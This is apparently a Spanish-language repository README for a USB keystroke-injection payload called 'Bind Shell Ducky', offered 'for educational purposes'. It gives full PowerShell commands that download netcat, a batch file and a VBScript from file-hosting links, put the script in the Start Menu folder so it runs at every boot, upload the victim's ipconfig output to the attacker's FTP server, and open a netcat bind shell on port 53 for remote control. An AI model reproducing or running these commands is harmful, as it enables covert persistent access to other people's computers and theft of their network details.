# Bind Shell Ducky
No me hago responsable del mal uso que se le pueda dar a esta herramienta. Sólo para fines educativos.

## Explicación

Este payload lo que hace es configurar una bind shell que se ejecutará cada vez que el ordenador se encienda. Para ello, descarga 3 archivos y sube a nuestro servidor ftp 
( podéis modificarlo para que se suba de otro modo) un archivo .txt que contiene la información con la IP del equipo víctima.


#### Archivos utilizados:

	-nc.exe en USERPROFILE (https://download1585.mediafire.com/25w5mwh6g4kg/ncd5kz7z6bv0bsa/nc.exe)
	-Archivo b.bat en cualquier directorio, en mi caso USERPROFILE (https://download1497.mediafire.com/8m313dl9bqqg/kluwkdgi8v6dovl/b.bat)
	-Archivo e.vbs en carpeta de menú de inicio (https://download1338.mediafire.com/gvrx9wxzrjzg/ohgvexnnc6axq1d/e.vbs)
	-Archivo a.txt que contendrá la <IP_VÍCTIMA> ubicada en C:\


#### Conseguir la <IP_VÍCTIMA> y enviarla :

	-En el mismo powershell: cd C:\
	-En la siguiente línea enviamos la ip a un bloc de notas: ipconfig > a.txt
	-Nos registramos en nuestro servidor ftp: ftp <HOST DEL DOMINIO>
	-<USUARIO>
	-<CONTRASEÑA>
	-Subimos el archivo ya creado: put a.txt
	-bye


#### Por último, ejecuta el programa:

	-En el mismo ps:  start $st\e.vbs 


#### ADICIONAL:    

  Para acelerar el proceso, se declaran las variables $us , $st y $client 
  
  La conexión es a través del Puerto 53 
  
  Recomendable modificar el Delay en el payload dependiendo de la velocidad del ordenador. La duración media es de 40 segundos. 
  
  El comando que aparece en el .bat es: .\nc -lvp 53 -e powershell 
  
  Para acceder a la shell del equipo víctima, debemos poner esto desde kali linux: nc <IP_VÍCTIMA> 53 
  
  La <IP_VÍCTIMA> estará en el archivo a.txt que habremos enviado por ftp durante el ataque. 
  
  Probablemente os pida aceptar una opción del firewall al finalizar el proceso. 
  
  Editar en el payload la contraseña, dominio y usuario del server ftp.
  


#### COMANDOS EN POWERSHELL:
```
	$us = $env:userprofile
	$st = $env:appdata + "\Microsoft\Windows\Start Menu\Programs\"
	$client = new-object System.Net.WebClient
	$client.DownloadFile("https://download1497.mediafire.com/8m313dl9bqqg/kluwkdgi8v6dovl/b.bat","$us\b.bat")
	$client.DownloadFile("https://download1585.mediafire.com/25w5mwh6g4kg/ncd5kz7z6bv0bsa/nc.exe","$us\nc.exe")
	$client.DownloadFile("https://download1338.mediafire.com/gvrx9wxzrjzg/ohgvexnnc6axq1d/e.vbs","$st\e.vbs")
	cd C:\
	ipconfig > a.txt
	ftp <DOMINIO>
	<USUARIO>
	<CONTRASEÑA
	put a.exe
	bye
	start $st\e.vbs  
	exit	
```

## Sígueme en mi cuenta de Instagram: [**@belmar_04**](https://www.instagram.com/belmar_04/)
